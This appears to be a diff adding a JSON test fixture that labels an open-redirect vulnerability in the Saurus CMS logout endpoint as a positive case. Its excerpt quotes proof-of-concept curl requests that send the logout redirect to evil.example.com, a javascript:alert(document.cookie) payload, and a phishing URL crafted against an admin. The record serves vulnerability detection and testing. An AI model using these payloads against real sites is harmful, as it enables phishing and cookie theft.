@@ -1,0 +1,47 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "detector_output_used": false,
+    "expected_condition_signals": [
+      "allowlist_bypass"
+    ],
+    "notes": "The reproduced logout exchange returns HTTP 302 with an attacker-controlled external Location.",
+    "ranking_output_used": false
+  },
+  "capture_method": "repository_test_fixture",
+  "capture_reference": "https://github.com/DevVaibhav07/VULN-POC/blob/main/Saurus_OpenRedirect.md",
+  "captured_at": "2026-08-14T16:44:16.234690+00:00",
+  "case_kind": "positive",
+  "collector": {
+    "command": "read sealed passive snapshot and/or fetch upstream source control",
+    "source_file": "Saurus_OpenRedirect.md",
+    "tool": "analysis-631-final21-source-grounded-collector"
+  },
+  "family": "open_redirect",
+  "raw": {
+    "details": {
+      "evidence-points": [
+        "caller supplies absolute external destination",
+        "HTTP 302 observed",
+        "Location host changed"
+      ]
+    },
+    "endpoint": "destination parameter",
+    "endpoint_schema": {},
+    "method": "UNKNOWN",
+    "target": "Saurus CMS logout"
+  },
+  "raw_sha256": "65bfd2d3526b7a3fe15b4d87aa2c88a1f672c6f8a9db3cae46c67be2a0552a6a",
+  "schema_version": "1.0",
+  "source_project": "sauruscms/Saurus-CMS-Community-Edition",
+  "source_root": "GHSA-jjjg-67rc-qf87",
+  "source_snapshot": {
+    "content_sha256": "bb9aec320b973c5e73503d884ba66425cbc663fd4e2f08e132e713762461fd12",
+    "payload": {
+      "excerpt": "//localhost:9080/index.php?op=logout&url=https://evil.example.com\" 2>&1 | grep \"Location:\" Response: HTTP/1.1 302 Found Location: https://evil.example.com POST-based redirect: bash curl -v -X POST -d \"op=logout&url=https://evil.example.com\" \\ \"http://localhost:9080/index.php\" 2>&1 | grep \"Location:\" Response: HTTP/1.1 302 Found Location: https://evil.example.com Admin panel endpoint: bash curl -v \"http://localhost:9080/admin/index.php?op=logout&url=https://evil.example.com\" 2>&1 | grep \"Location:\" Response: HTTP/1.1 302 Found Location: https://evil.example.com javascript: scheme accepted: bash curl -v \"http://localhost:9080/index.php?op=logout&url=javascript:alert(document.cookie)\" 2>&1 | grep \"Location:\" Response: HTTP/1.1 302 Found Location: javascript:alert(document.cookie) --- Impact An attacker crafts a logout URL and sends it to a CMS admin: https://victim-cms.com/admin/index.php?op=logout&url=https://phishing-site.com/cms-login Attac"
+    },
+    "reference": "https://github.com/DevVaibhav07/VULN-POC/blob/main/Saurus_OpenRedirect.md",
+    "retrieved_at": "2026-08-14T16:44:16.234690+00:00"
+  }
+}
